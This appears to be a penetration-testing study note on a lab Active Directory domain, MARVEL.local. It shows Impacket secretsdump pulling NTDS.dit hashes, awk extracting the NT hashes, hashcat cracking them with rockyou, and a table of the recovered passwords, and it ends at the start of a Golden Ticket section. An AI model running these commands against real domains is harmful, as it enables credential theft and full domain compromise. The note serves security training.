
## Dump the NTDS.dit

NTDS.dit (**NT directory Services Database**) is the main database file Active Directory Domain Services (AD DS) in Windows Server. It stores all Active Directory data, including *user accounts*, *passwords*, *groups*, *computers*, *policies*, and *permissions*.

We can use the `haweke` account we created during the [[Token Impersonation]] attack to dump the secrets. We can use the `-just-dc-ntlm` flag in `secretsdump` to indicate we are only interested in the NTDS.dit. If not we would get all secrets as shown [[Token Impersonation#^fullDump|here]].

```bash
$ secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.23.130 -just-dc-ntlm
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:95429b379eb022b428e2acb40508a8bc:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:8c3efc486704d2ee71eebe71af14d86c:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SqaSKUfcVl:1112:aad3b435b51404eeaad3b435b51404ee:ada2848eddc9cc62b2c83e36671cb5c3:::
hawkeye:1113:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:69646703f8dc139544866f750f803717:::
THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:2a5d646955ce36f130d78437a585dd76:::
SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:ead11176853925d8c6855102816bd3ea:::
```

Next we can extract the NT part of the above hashes and store them in a file to be cracked using `hashcat` using the `rockyou` word list.


```bash
$ cat ntds.dump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:95429b379eb022b428e2acb40508a8bc:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:8c3efc486704d2ee71eebe71af14d86c:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SqaSKUfcVl:1112:aad3b435b51404eeaad3b435b51404ee:ada2848eddc9cc62b2c83e36671cb5c3:::
hawkeye:1113:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:69646703f8dc139544866f750f803717:::
THEPUNISHER$:1107:aad3b435b51404eeaad3b435b51404ee:2a5d646955ce36f130d78437a585dd76:::
SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:ead11176853925d8c6855102816bd3ea:::

$ cat ntds.dump |  awk -F: '{print $(NF-3)}'
920ae267e048417fcfe00f49ecbd4b33
31d6cfe0d16ae931b73c59d7e0c089c0
95429b379eb022b428e2acb40508a8bc
8c3efc486704d2ee71eebe71af14d86c
f4ab68f27303bcb4024650d8fc5f973a
64f12cddaa88057e06a81b54e73b949b
c39f2beb3d2ec06a62cb887fb391dee0
ada2848eddc9cc62b2c83e36671cb5c3
43460d636f269c709b20049cee36ae7a
69646703f8dc139544866f750f803717
2a5d646955ce36f130d78437a585dd76
ead11176853925d8c6855102816bd3ea

$ cat ntds.dump |  awk -F: '{print $(NF-3)}' > ntds.hashes
$ hashcat -m 1000 -a 0 ntds.hashes /usr/share/wordlists/rockyou.txt 
$ hashcat -m 1000 -a 0 ntds.hashes /usr/share/wordlists/rockyou.txt --show
920ae267e048417fcfe00f49ecbd4b33:P@$$w0rd!
31d6cfe0d16ae931b73c59d7e0c089c0:
8c3efc486704d2ee71eebe71af14d86c:Password1234
f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
64f12cddaa88057e06a81b54e73b949b:Password1
c39f2beb3d2ec06a62cb887fb391dee0:Password2
43460d636f269c709b20049cee36ae7a:Password1@
```

Now we have the following accounts along their cracked passwords!

| Account                    | NTLM Hash                        | Cracked Password |
| -------------------------- | -------------------------------- | ---------------- |
| MARVEL.local\SQLService    | f4ab68f27303bcb4024650d8fc5f973a | MYpassword123#   |
| Administrator		<br>        | 920ae267e048417fcfe00f49ecbd4b33 | P@$$w0rd!        |
| MARVEL.local\fcastle		<br> | 64f12cddaa88057e06a81b54e73b949b | Password1        |
| hawkeye		<br>              | 43460d636f269c709b20049cee36ae7a | Password1@       |
| MARVEL.local\tstark		<br>  | 8c3efc486704d2ee71eebe71af14d86c | Password1234     |
| MARVEL.local\pparker       | c39f2beb3d2ec06a62cb887fb391dee0 | Password2        |

## Golden Ticket Attack

Once we have compromised the `krbtgt` account, we can request access to any resource or system on the domain.